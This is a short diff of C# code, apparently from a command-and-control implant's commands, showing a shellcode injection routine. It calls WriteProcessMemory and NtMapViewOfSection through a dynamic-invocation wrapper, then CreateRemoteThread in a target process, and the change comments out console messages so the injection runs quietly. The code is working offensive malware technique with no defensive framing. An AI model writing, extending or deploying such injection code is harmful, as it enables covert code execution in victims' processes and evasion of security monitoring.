@@ -81,7 +81,7 @@ namespace Engineer.Commands
             // invoke the api call, pass the dll, function name, delegate type, parameters        
             reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "WriteProcessMemory", typeof(WinApiDynamicDelegate.WriteProcessMemory), writeProcessParameters, false);
             numberOfBytes = (IntPtr)writeProcessParameters[4];
-            Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");
+            //Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");
 
             // dinvoke map view of section remote which basically copies shellcode
             IntPtr remoteBaseAddress = new IntPtr();
@@ -89,8 +89,7 @@ namespace Engineer.Commands
             // invoke the api call, pass the dll, function name, delegate type, parameters        
             reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
             remoteBaseAddress = (IntPtr)mapViewParameters[2];
-            Console.WriteLine($"Mapped view to target");
-
+            //Console.WriteLine($"Mapped view to target");
             var createThreadResult = (WinAPIs.Kernel32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero);
             reprobate.FreeModule(ntdll);
             reprobate.FreeModule(ker32);
